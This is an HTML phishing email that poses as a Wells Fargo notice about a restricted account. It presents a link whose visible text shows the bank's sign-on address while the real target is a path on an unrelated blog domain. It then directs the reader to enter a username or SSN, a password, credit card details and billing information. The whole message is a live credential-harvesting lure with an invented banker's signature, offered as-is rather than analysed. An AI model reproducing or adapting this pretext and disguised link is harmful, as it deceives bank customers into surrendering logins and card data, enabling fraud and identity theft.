<p><strong>Dear Wells Fargo Customer :</strong></p>
<p>Wells Fargo is constantly working to increase security for all Online Banking
  users. To ensure the integrity of our online payment system, we periodically
  review accounts.</p>
<p>Your account might be place on restricted status. Restricted accounts continue
  to receive payments, but they are limited in their ability to send or withdraw
funds.</p>
<p>To lift up this restriction follow the link bellow and fill in the necessary
fields:</p>
<p><a href="http://blog.herrbaumann.de/images/online.wellsfargo.com/auxiliary_access/1999/bb61162e7a787f/common/az1_db3_on/cgi-bin/a248.e.akamai.net/Mprc6XvBkuZqDGNbqlxb&PROCESSING_TRANSACTIO/wellsfargo/">https://online.wellsfargo.com/signon?LOB=CONS</a><br>
</p>
<p>Then ...you need to login into your account (<strong>with your username or
    SSN and
your password</strong>) , then you have to complete our verification process. You must
confirm your credit card details and your billing information as well . All restricted
  accounts have their billing information unconfirmed, meaning that you may no
  longer send money from your account until you have updated your billing information
  on file.<br>
</p>
<p>Best Regards,</p>
<p>Matt Lundquist<br>
Wells Fargo NBBC Sales Development Banker</p>
